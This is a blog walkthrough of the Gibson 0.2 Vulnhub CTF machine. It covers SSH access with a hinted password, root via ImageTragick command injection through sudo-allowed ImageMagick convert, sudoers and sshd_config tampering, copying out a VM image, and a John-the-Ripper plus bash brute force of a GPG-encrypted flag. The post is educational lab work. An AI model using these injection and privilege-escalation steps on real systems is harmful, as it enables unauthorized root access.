---
layout: post
title: "Gibson 0.2 walkthrough"
date: 2017-10-28 16:10:23 -0400
comments: true
categories: [penetration testing, writeups]
keywords: gibson, gibson 0.2, gibson vulnhub, gibson writeup, gibson ctf, gibson walkthrough, gibson solution, gibson 0.2 vm
description: Gibson 0.2 writeup
---



The Vulnhub machine I picked for today's target is called Gibson. For this challenge, there are also some hints:

- SSH can forward X11.
- The challenge isn't over with root. The flag is not where you expect to find it.

Let's see what Gibson has in store for us!

<!-- more -->

## Recon

``` 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 273   2016-05-07 13:03  davinci.html
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
``` 

Looks like we only have SSH and a web server running on this box. The Gibson Mining Corporation page contains a  davinci.html file with a bolded message: <code>The answer you seek will be found by brute force</code>. And the page source also has an interesting comment:

``` 
<!-- Damn it Margo! Stop setting your password to "god" -->
<!-- at least try and use a different one of the 4 most -->
<!-- common ones! (eugene) -->
```

With this information in hand, I tried SSH'ing as Margo with password god. That didn't work, but doing it as margo instead got me in. We have a shell on the box already!

## Privilege escalation

We're in as margo, but we need root. I ran my [linux_pricheck script](https://github.com/chousensha/linux_privcheck) and sifted through the output to see what might be helpful. Some of the discoveries:

* there is a network interface connected to a different subnet:

``` 
virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb  
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:7 errors:0 dropped:0 overruns:0 frame:0
          TX packets:17 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1347 (1.3 KB)  TX bytes:2459 (2.4 KB)
```

* VNC is running on the localhost:

``` 
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
```

* user marvo has some sudo privileges that need to be checked out:

``` 
User margo may run the following commands on gibson:
    (ALL) NOPASSWD: /usr/bin/convert
```

* other users on the host are duke and eugene


Alright, we have a solid start. First thing I did was check that convert binary:

``` 
margo@gibson:~$ /usr/bin/convert
Version: ImageMagick 6.7.7-10 2014-03-06 Q16 http://www.imagemagick.org
Copyright: Copyright (C) 1999-2012 ImageMagick Studio LLC
Features: OpenMP    

Usage: convert [options ...] file [ [options ...] file ...] [options ...] file
[...]
```

ImageMagick? More like [ImageTragick](https://www.exploit-db.com/exploits/39767/). This particular version of the ImageMagick library is vulnerable to command execution due to insufficient filtering in shell characters.

> Insufficient filtering for filename passed to delegate's command allows
> remote code execution during conversion of several file formats.
 
> ImageMagick allows to process files with external libraries. This
> feature is called 'delegate'. It is implemented as a system() with command string ('command')  

> One of the default delegate's command is used to handle https requests:

> "wget" -q -O "%o" "https:%M"

> Due to insufficient %M param filtering it is possible to conduct shell command injection, where %M is the actual 
> link from the input. It is possible to pass the value like `https://example.com"|ls "-la` and 
> execute unexpected 'ls -la'. (wget or curl should be installed)

So, the injection would look like this: 

<code>/usr/bin/convert 'https://dummyurl"| command"' tragic.png</code>

And if the command takes arguments:

<code>/usr/bin/convert 'https://dummyurl"| command"-flags' tragic.png</code>

Of course, you are not limited to the pipe character. You can also use **;**.

Since the convert binary runs with sudo privileges, it is possible to escalate privileges by editing **/etc/sudoers**:

``` 
margo@gibson:~$ sudo /usr/bin/convert 'https://dummyurl";vim /etc/sudoers"' tragic.png
```

The sudoers file will pop up in vim, and I gave full access to margo:

``` 
# User privilege specification
root    ALL=(ALL:ALL) ALL

margo    ALL=(ALL:ALL) ALL
```

Also, some other interesting tidbits in the the sudoers file:

``` 
# Allow members of group sudo to execute any command
## disabled after Margo's security incident
##%sudo ALL=(ALL:ALL) ALL

# Allow Margo to convert pictures from the FTP server
margo ALL=(ALL) NOPASSWD: /usr/bin/convert
# Allow eugene to manage virtual machines and visudo
eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
eugene ALL=(ALL:ALL)  /usr/sbin/visudo
```

I quit vim with <code>:wq!</code> to override the warning I got. The convert binary throws some errors, but the code was executed!

``` 
convert: unable to open image `/tmp/magick-AJXBjcDc': No such file or directory @ error/blob.c/OpenBlob/2638.
convert: unable to open file `/tmp/magick-AJXBjcDc': No such file or directory @ error/constitute.c/ReadImage/583.
convert: no images defined `tragic.png' @ error/convert.c/ConvertImageCommand/3044.
margo@gibson:~$ sudo su
[sudo] password for margo: 
root@gibson:/home/margo# 
``` 

From the system recon we performed, we know there is a VM running on the host. I re-ran my SSH connection with the **-X** flag to enable X11 forwarding, because I wanted to use virt-manager to take a look at the VM. However, I got an error: <code>X11 connection rejected because of wrong authentication</code>. Not a problem, we have virsh!

``` 
root@gibson:~# virsh list --all
 Id    Name                           State
----------------------------------------------------
 2     ftpserv                        running
```

At this point, I wanted to make things easier for me, so I decided to get the VM to my own system and continue from there. I located the VM:

``` 
ls /var/lib/libvirt/images/
ftpserv.img
```

To transfer the VM using scp, I first needed to enable SSH'ing as root. I edited <code>/etc/ssh/sshd_config</code> to have the following:

``` 
PermitRootLogin yes 
AllowUsers eugene margo root
Match user root
    PasswordAuthentication yes
```

Then I changed root's password, and reloaded the SSH config file with <code>service ssh reload</code>. Now I was able to transfer the image:

``` 
scp root@192.168.217.148:/var/lib/libvirt/images/ftpserv.img /mnt/ftpserv.img
Ubuntu 14.04.3 LTS
root@192.168.217.148's password: 
ftpserv.img                                   100%  512MB  22.6MB/s   00:22    
```

Let's see what we have here:

``` 
file ftpserv.img 
ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
```

To mount it, we need to learn the offset:

``` 
fdisk -l ftpserv.img 
Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x00000000

Device       Boot Start     End Sectors   Size Id Type
ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)
```

So the start block is 63 and the block size is 512..then the offset is 63 * 512, or 32256. Time to mount the image:

``` 
root@kali:/mnt# mkdir ftpserv
mount -o loop,offset=32256 ftpserv.img ftpserv
```

Mounting is done via the loop device, which is a file that acts as a block-based device. Now, a new device called KFLYNN appeared on my system. Kevin Flynn, maybe? Anyway, let's look inside:

``` 
ls ftpserv
AUTOEXEC.BAT  COMMAND.COM  FDCONFIG.SYS  KERNEL.SYS
BOOTSECT.BIN  DOS          GARBAGE       net
```

The GARBAGE directory seems interesting:

``` 
ls GARBAGE/
adminspo.jpg  flag.img  jz_ug.ans
```

Let's see the picture first:

{% img center /images/pentest/gibson/adminspo.jpg 'sysadmin' 'sysadmin life' %}

I also ran exiftool on it and was rewarded with..something:

``` 
exiftool adminspo.jpg 
ExifTool Version Number         : 10.60
File Name                       : adminspo.jpg
Directory                       : .
File Size                       : 120 kB
File Modification Date/Time     : 2016:05:04 17:17:44-04:00
File Access Date/Time           : 2017:10:01 15:14:34-04:00
File Inode Change Date/Time     : 2016:05:04 17:31:08-04:00
File Permissions                : rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
Modify Date                     : 2016:05:04 22:29:32
Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
[...]
```

Next I looked at the ANS file:

``` 
file jz_ug.ans 
jz_ug.ans: ISO-8859 text, with CRLF line terminators, with escape sequences
```

Apparently, this type of file is a text document graphic based on the ANSI text standard; may also be used to store text graphics, which uses characters to display images in a text document. I read it like a text file:

``` 
cat jz_ug.ans 


   �������ݲܱ����ܲ����۲ܱ�������������ܲ�ܲ������������ܲ�ܱ��ܲ�ܱ����
    �����������������������������������������������������۲���������������
    �������������������������۲���������� ��������۲�����۲���������������
    ���������������������������������������������������� �����������������
    ޲���������۲�����۲�����������    �����۲���    ����������߲������۲�
     ��߱� ����������߲����������߲    �����߲���    ����߲���߲��ݲ����߲jz
                                  �                            �         �
                    the ugliest of all are under 5 feet tall
```

Hmm, ok. Finally, another image file:

``` 
file flag.img 
flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121
```

This time it's an EXT2 filesystem. I mounted it:

``` 
mount ftpserv/GARBAGE/flag.img flag
ls -la
total 70
drwxr-xr-x 4 root root  1024 May 14  2016 .
drwxr-xr-x 5 root root  4096 Oct 28 13:05 ..
-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
drwx------ 2 root root 12288 May  5  2016 lost+found
drwxr-xr-x 2 root root  1024 May  5  2016 .trash
```

Davinci is a snake game:

``` 
		    _________         _________ 			
		   /         \       /         \ 			
		  /  /~~~~~\  \     /  /~~~~~\  \ 			
		  |  |     |  |     |  |     |  | 			
		  |  |     |  |     |  |     |  | 			
		  |  |     |  |     |  |     |  |         /	
		  |  |     |  |     |  |     |  |       //	
		 (o  o)    \  \_____/  /     \  \_____/ / 	
		  \__/      \         /       \        / 	
		    |        ~~~~~~~~~         ~~~~~~~~ 		
		    ^								
			Welcome To The Snake Game!			
				    Press Any Key To Continue...	

```

Its source code hints that it's vulnerable to buffer overflow if more than 128 characters are entered. Let's look at the hint now:

``` 
cat hint.txt 
http://www.imdb.com/title/tt0117951/ and
http://www.imdb.com/title/tt0113243/ have
someone in common... Can you remember his
original nom de plume in 1988...?
```

The IMDB references are for the movies Trainspotting and Hackers. And who do they have in common? Jonny Lee Miller. You can find the name referenced in the hint by reading the description for the Hackers movie. It's a handle: Zero Cool.

And finally, the hidden directory:

``` 
ls -l
total 317
---x------ 1 root root    469 May 14  2016 flag.txt.gpg
-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg
```

The image is an ad for Trainspotting and has nothing out of the ordinary in the exiftool output. And, of course, the best for last! It seems we have a flag, but it's encrypted. I tried some ZeroCool variations, but it seems more calculation power will need to be thrown at this. I made a file with the handle to be transformed in many possible passwords by John:

``` 
cat tries.txt 
zero cool
zerocool
zero kool
zerokool
```

Next I used John to generate a file of uppercase and lowercase combinations from this initial file:

``` 
john --rules=nt --wordlist=tries.txt --stdout > pass.txt
Created directory: /root/.john
Press 'q' or Ctrl-C to abort, almost any other key for status
1504p 0:00:00:01 100.00% (2017-10-28 13:37) 1139p/s ZERO KOOL
```

And after so many hacker references, also add l33t speak to the combinations, with Korelogic rules. First, download the rules file:

``` 
wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801.txt
```

Now add the rules to John's config file:

``` 
cat korelogic-rules-20100801.txt >> /etc/john/john.conf
```

Now I was able to generate the file with p@$$w0rd$:

``` 
john --rules=KoreLogicRulesL33t --wordlist=pass.txt --stdout > coolpass.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
132384p 0:00:00:00 100.00% (2017-10-28 13:54) 240698p/s Z3ro k0o1
```

And a quick shell script for bruteforcing from the file:

``` 
for pass in $(cat coolpass.txt) ; do
	echo "Trying:" $pass
	gpg --batch --status-fd --with-colons --output flag.txt --passphrase $pass --decrypt flag.txt.gpg
	if [ -a "flag.txt" ]; then echo "Passphrase found! $pass"
	break
	fi
done
```

The correct passphrase is **Z3r0K00l**

``` 
Trying: Z3r0K00l
gpg: CAST5 encrypted data
[GNUPG:] NEED_PASSPHRASE_SYM 3 3 2
gpg: encrypted with 1 passphrase
[GNUPG:] BEGIN_DECRYPTION
[GNUPG:] DECRYPTION_INFO 0 3
[GNUPG:] PLAINTEXT 62 1463231918 flag.txt
[GNUPG:] PLAINTEXT_LENGTH 862
[GNUPG:] DECRYPTION_OKAY
gpg: WARNING: message was not integrity protected
[GNUPG:] END_DECRYPTION
Passphrase found! Z3r0K00l
```

And the flag is:

``` 
cat flag.txt
 _   _            _      _____ _             ____  _                  _   _
| | | | __ _  ___| | __ |_   _| |__   ___   |  _ \| | __ _ _ __   ___| |_| |
| |_| |/ _` |/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _` | '_ \ / _ \ __| |
|  _  | (_| | (__|   <    | | | | | |  __/  |  __/| | (_| | | | |  __/ |_|_|
|_| |_|\__,_|\___|_|\_\   |_| |_| |_|\___|  |_|   |_|\__,_|_| |_|\___|\__(_)


Should you not be standing in a 360 degree rotating payphone when reading
this flag...? B-)

Anyhow, congratulations once more on rooting this VM. This time things were
a bit esoteric, but I hope you enjoyed it all the same.

Shout-outs again to #vulnhub for hosting a great learning tool. A special
thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
to host the CTF once more.
                                                              --Knightmare
```

**Learn more**

- [ImageTragick](https://imagetragick.com/)


``` 
 ________________________________________
/ Q: Why is Christmas just like a day at \
| the office? A: You do all of the work  |
| and the fat guy in the suit            |
|                                        |
\ gets all the credit.                   /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

